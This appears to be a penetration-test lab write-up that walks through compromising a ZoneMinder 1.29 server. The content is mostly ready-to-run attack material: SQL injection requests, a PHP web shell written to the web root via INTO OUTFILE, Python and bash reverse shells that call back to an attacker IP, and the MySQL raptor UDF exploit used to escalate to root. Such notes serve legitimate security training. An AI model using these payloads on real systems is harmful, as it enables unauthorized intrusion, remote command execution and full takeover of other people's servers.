## OPEN PORTS 
```bash
21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
3305/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
```
## INITIAL FOOTHOLD
```bash
# Found - http://192.168.160.52/zm/ - ZoneMinder Console - Running - default v1.29.0
# Found - http://192.168.160.52:3305/zm/ - ZoneMinder Console - Running - default v1.29.0
# Found - http://192.168.160.52:8080/zm/ - ZoneMinder Console - Running - default v1.29.0

# ZoneMinder Console - Running - default v1.29.0
- Found Exploit
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery| php/webapps/41239.txt

# Poc 
2)SQL Injection
Example Url:http://192.168.241.131/zm/index.php
Parameter: limit (POST)
Type: stacked queries
Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
Payload: view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434

# SQLi - Using burpsuite - Changed request method to POST
# Check SQLi using payload "SELECT SLEEP(5)" - WORKED
POST /zm/index.php HTTP/1.1
Host: 192.168.160.52
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=38rs379mnva7iv0l88ecjs1o20
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5

# 
POST /zm/index.php HTTP/1.1
Host: 192.168.160.52
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=38rs379mnva7iv0l88ecjs1o20
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
view=request&request=log&task=query&limit=100;SELECT "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/backdoor.php'#&minTime=5


# /backdoor.php - found on port 3305 http://192.168.160.52:3305/backdoor.php

# Web Shell
curl 'http://192.168.160.52:3305/backdoor.php?cmd=id'

# Proper Reverse Shell
http://192.168.160.52:3305/backdoor.php?cmd=python3%20-c%20%22import%20os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27192.168.45.203%27,80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(%27HISTFILE%27,%27/dev/null%27);pty.spawn([%27/bin/bash%27,%27-i%27]);s.close();exit();%22
```
## PRIVILEGE ESCALTION
```bash
# SQLi POST via Burpsuite - for reverse shell
view=request&request=log&task=query&limit=100;SELECT "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/backdoor.php'#&minTime=5

# Since able to write files as root using SQLi
-rw-rw-rw- 1 root root    39 Nov 14 01:19 backdoor.php

# MySQL run with root privileges
# The UDF exploit primarily targets versions of MySQL before 5.7.7
# Execute SQLi to Reverse shell via burpsuite for Privilege Escalation
# Using mysql UDF Exploit
mysql --version
mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper

# Exploit 
https://www.exploit-db.com/exploits/1518

# Steps to Privesc
searchsploit -m linux/local/1518.c
mv 1518.c raptor_udf2.c
# Since gcc is not available on the machine compiled on kali machine
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
# Transfer raptor_udf2.so from kali machine to /tmp/ of vulnerable machine
# Create a reverse shell file named shell.sh on /tmp/ directory
# shell.sh file contents
bash -i >& /dev/tcp/192.168.45.203/80 0>&1

# From Burpsuite - Post Request
- Request 1
view=request&request=log&task=query&limit=100;create table foo(line blob); insert into foo values(load_file('/tmp/raptor_udf2.so'));#&minTime=5
- Request 2
view=request&request=log&task=query&limit=100;select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';#&minTime=5
- Request 3
view=request&request=log&task=query&limit=100;create function do_system returns integer soname 'raptor_udf2.so';#&minTime=5
- Request 4 (set reverse shell netcat listener ready on port 80)
view=request&request=log&task=query&limit=100;select do_system('/bin/bash /tmp/shell.sh');#&minTime=5

# Grab the shell
# root
```
